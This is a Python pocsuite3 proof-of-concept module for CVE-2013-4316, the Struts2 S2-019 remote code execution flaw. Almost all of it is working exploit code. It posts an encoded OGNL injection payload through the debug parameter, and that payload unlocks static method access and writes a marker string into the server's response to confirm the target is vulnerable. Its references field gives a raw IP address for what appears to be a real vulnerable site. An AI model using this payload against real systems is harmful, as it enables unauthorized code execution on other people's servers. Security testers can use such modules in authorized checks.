# -*- coding:utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from urllib.parse import urljoin
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = "CVE-2013-4316"
    version ='1'
    author = ["LMX"]
    vulDate = "2013-9-30"
    createDate = "2022-2-3"
    updateDate = "2022-2-3"
    references =["http://5.249.156.94:8080/etrackweb/loginAction.action"]
    name ="S2-019 Remote Code Execution Vulnerablity"
    appPowerLink = ''
    appName = 'Strute2'
    appVersion = '2.0.0 - 2.3.15.1'
    vulType = 'RCE'
    desc = '''
    struts2-019远程代码执行漏洞
    '''

    def _verify(self):
        result ={}
        payload = '''debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27webpath%27%2b%2788888888%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29'''
        headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Cookie':'SessionId=96F3F15432E0660E0654B1CE240C4C36'
                    }
        url = self.url
        r = requests.post(url=self.url,headers=headers,data=payload)

        try:
            if 'webpath88888888' in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
        except Exception as e:
            pass
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()
register_poc(DemoPOC)
